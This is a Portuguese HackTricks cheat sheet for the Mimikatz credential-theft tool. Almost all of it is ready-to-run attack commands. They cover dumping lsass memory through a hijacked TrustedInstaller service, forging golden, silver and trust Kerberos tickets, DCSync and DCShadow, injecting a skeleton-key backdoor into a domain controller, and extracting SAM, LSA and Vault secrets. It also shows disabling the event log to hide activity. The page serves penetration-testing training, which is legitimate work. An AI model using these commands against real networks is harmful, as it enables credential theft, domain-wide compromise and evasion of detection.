# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Esta página é baseada em uma do [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Confira o original para mais informações!

## LM e Senhas em Texto Claro na Memória

A partir do Windows 8.1 e Windows Server 2012 R2, medidas significativas foram implementadas para proteger contra o roubo de credenciais:

- **Hashes LM e senhas em texto claro** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com um valor DWORD de `0` para desativar a Autenticação Digest, garantindo que senhas "em texto claro" não sejam armazenadas em cache no LSASS.

- **Proteção LSA** é introduzida para proteger o processo da Autoridade de Segurança Local (LSA) contra leitura não autorizada de memória e injeção de código. Isso é alcançado marcando o LSASS como um processo protegido. A ativação da Proteção LSA envolve:
1. Modificar o registro em _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ definindo `RunAsPPL` para `dword:00000001`.
2. Implementar um Objeto de Política de Grupo (GPO) que aplica essa alteração de registro em dispositivos gerenciados.

Apesar dessas proteções, ferramentas como Mimikatz podem contornar a Proteção LSA usando drivers específicos, embora tais ações provavelmente sejam registradas nos logs de eventos.

### Combatendo a Remoção do SeDebugPrivilege

Administradores normalmente têm SeDebugPrivilege, permitindo que eles depurem programas. Este privilégio pode ser restrito para evitar despejos de memória não autorizados, uma técnica comum usada por atacantes para extrair credenciais da memória. No entanto, mesmo com esse privilégio removido, a conta TrustedInstaller ainda pode realizar despejos de memória usando uma configuração de serviço personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Isso permite o despejo da memória do `lsass.exe` em um arquivo, que pode ser analisado em outro sistema para extrair credenciais:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opções do Mimikatz

A manipulação de logs de eventos no Mimikatz envolve duas ações principais: limpar logs de eventos e patching do serviço de Eventos para evitar o registro de novos eventos. Abaixo estão os comandos para realizar essas ações:

#### Limpando Logs de Eventos

- **Comando**: Esta ação visa deletar os logs de eventos, dificultando o rastreamento de atividades maliciosas.
- O Mimikatz não fornece um comando direto em sua documentação padrão para limpar logs de eventos diretamente via sua linha de comando. No entanto, a manipulação de logs de eventos geralmente envolve o uso de ferramentas de sistema ou scripts fora do Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou Visualizador de Eventos do Windows).

#### Recurso Experimental: Patching do Serviço de Eventos

- **Comando**: `event::drop`
- Este comando experimental é projetado para modificar o comportamento do Serviço de Registro de Eventos, efetivamente impedindo-o de registrar novos eventos.
- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`

- O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar serviços do sistema.
- O comando `event::drop` então faz o patch do serviço de Registro de Eventos.

### Ataques de Ticket Kerberos

### Criação de Golden Ticket

Um Golden Ticket permite a impersonação de acesso em todo o domínio. Comando e parâmetros principais:

- Comando: `kerberos::golden`
- Parâmetros:
- `/domain`: O nome do domínio.
- `/sid`: O Identificador de Segurança (SID) do domínio.
- `/user`: O nome de usuário a ser impersonado.
- `/krbtgt`: O hash NTLM da conta de serviço KDC do domínio.
- `/ptt`: Injeta diretamente o ticket na memória.
- `/ticket`: Salva o ticket para uso posterior.

Exemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Criação de Silver Ticket

Silver Tickets concedem acesso a serviços específicos. Comando e parâmetros principais:

- Comando: Semelhante ao Golden Ticket, mas direciona serviços específicos.
- Parâmetros:
- `/service`: O serviço a ser direcionado (por exemplo, cifs, http).
- Outros parâmetros semelhantes ao Golden Ticket.

Exemplo:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Criação de Ticket de Confiança

Tickets de Confiança são usados para acessar recursos entre domínios aproveitando relacionamentos de confiança. Comando e parâmetros principais:

- Comando: Semelhante ao Golden Ticket, mas para relacionamentos de confiança.
- Parâmetros:
- `/target`: O FQDN do domínio alvo.
- `/rc4`: O hash NTLM para a conta de confiança.

Exemplo:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos Adicionais do Kerberos

- **Listando Tickets**:

- Comando: `kerberos::list`
- Lista todos os tickets do Kerberos para a sessão do usuário atual.

- **Passar o Cache**:

- Comando: `kerberos::ptc`
- Injeta tickets do Kerberos a partir de arquivos de cache.
- Exemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passar o Ticket**:

- Comando: `kerberos::ptt`
- Permite usar um ticket do Kerberos em outra sessão.
- Exemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Limpar Tickets**:
- Comando: `kerberos::purge`
- Limpa todos os tickets do Kerberos da sessão.
- Útil antes de usar comandos de manipulação de tickets para evitar conflitos.

### Manipulação do Active Directory

- **DCShadow**: Faz uma máquina agir temporariamente como um DC para manipulação de objetos do AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imitar um DC para solicitar dados de senha.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acesso a Credenciais

- **LSADUMP::LSA**: Extrair credenciais do LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersonar um DC usando os dados de senha de uma conta de computador.

- _Nenhum comando específico fornecido para NetSync no contexto original._

- **LSADUMP::SAM**: Acessar o banco de dados SAM local.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descriptografar segredos armazenados no registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Definir um novo hash NTLM para um usuário.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recuperar informações de autenticação de confiança.
- `mimikatz "lsadump::trust" exit`

### Diversos

- **MISC::Skeleton**: Injetar um backdoor no LSASS em um DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalação de Privilégios

- **PRIVILEGE::Backup**: Adquirir direitos de backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obter privilégios de depuração.
- `mimikatz "privilege::debug" exit`

### Extração de Credenciais

- **SEKURLSA::LogonPasswords**: Mostrar credenciais de usuários logados.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrair tickets do Kerberos da memória.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulação de SID e Token

- **SID::add/modify**: Alterar SID e SIDHistory.

- Adicionar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modificar: _Nenhum comando específico para modificar no contexto original._

- **TOKEN::Elevate**: Impersonar tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Serviços de Terminal

- **TS::MultiRDP**: Permitir múltiplas sessões RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listar sessões TS/RDP.
- _Nenhum comando específico fornecido para TS::Sessions no contexto original._

### Cofre

- Extrair senhas do Cofre do Windows.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
